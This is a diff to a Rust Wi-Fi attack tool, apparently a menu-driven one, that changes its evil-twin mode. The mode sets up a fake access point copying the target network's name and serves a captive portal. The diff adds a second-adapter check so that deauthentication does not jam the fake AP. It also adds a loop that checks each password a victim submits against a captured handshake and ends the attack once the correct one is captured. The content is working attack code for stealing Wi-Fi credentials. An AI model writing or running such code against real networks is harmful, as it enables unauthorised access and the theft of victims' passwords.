@@ -653,6 +653,15 @@ fn run_attack(agent: &mut Agent, ap: &AP, iface: &str, action: &str) {
         }
         "evil-twin" => {
             header("EVIL TWIN");
+            let ifaces = list_wireless();
+            if ifaces.len() < 2 {
+                warn("only ONE wireless adapter detected — the deauth side will jam your own fake AP.");
+                println!("{}", ui::dim("  a second adapter (USB) is strongly recommended for this attack."));
+                let go = prompt("continue anyway? [y/N]:");
+                if !matches!(go.as_str(), "y" | "Y" | "yes") {
+                    return;
+                }
+            }
             let ssid = prompt(&format!("fake AP name (Enter = copy '{}'):", ap.essid));
             let ssid = if ssid.is_empty() { ap.essid.clone() } else { ssid };
             let portal = prompt(
@@ -677,11 +686,31 @@ fn run_attack(agent: &mut Agent, ap: &AP, iface: &str, action: &str) {
                 Ok(Response::EvilTwinSession(s)) => {
                     ok(&format!("fake AP is live: '{}' on channel {}", s.config.ssid, s.config.channel));
                     println!("  portal: {}", ui::cyan(&s.portal_url));
-                    println!("{}", ui::yellow("  victims' submitted passwords appear here as they type them."));
-                    println!("{}", ui::dim("  press Enter to STOP the evil twin and clean up"));
-                    wait_enter();
+                    println!("{}", ui::yellow("  every submitted password is verified against the handshake;"));
+                    println!("{}", ui::yellow("  the session ends BY ITSELF the moment the right one lands."));
+                    println!("{}", ui::dim("  (press Enter at any time to stop manually)"));
+                    spawn_enter_watcher();
+                    let started = Instant::now();
+                    loop {
+                        if user_pressed_enter() {
+                            println!("{}", ui::dim("stopping on request…"));
+                            break;
+                        }
+                        match agent.call(Request::IsEvilTwinPasswordVerified) {
+                            Ok(Response::Bool(true)) => {
+                                let secs = started.elapsed().as_secs();
+                                println!();
+                                ok(&format!("PASSWORD VERIFIED — captured in {secs}s. Stopping the attack…"));
+                                break;
+                            }
+                            _ => {}
+                        }
+                        print!(".");
+                        let _ = std::io::Write::flush(&mut std::io::stdout());
+                        std::thread::sleep(std::time::Duration::from_secs(1));
+                    }
                     let _ = agent.call(Request::StopEvilTwin { iface: iface.into() });
-                    ok("evil twin stopped, NAT rules cleaned");
+                    ok("evil twin stopped, daemons + NAT cleaned");
                 }
                 Ok(Response::Error { message }) | Err(message) => fail(&message),
                 _ => fail("unexpected response"),
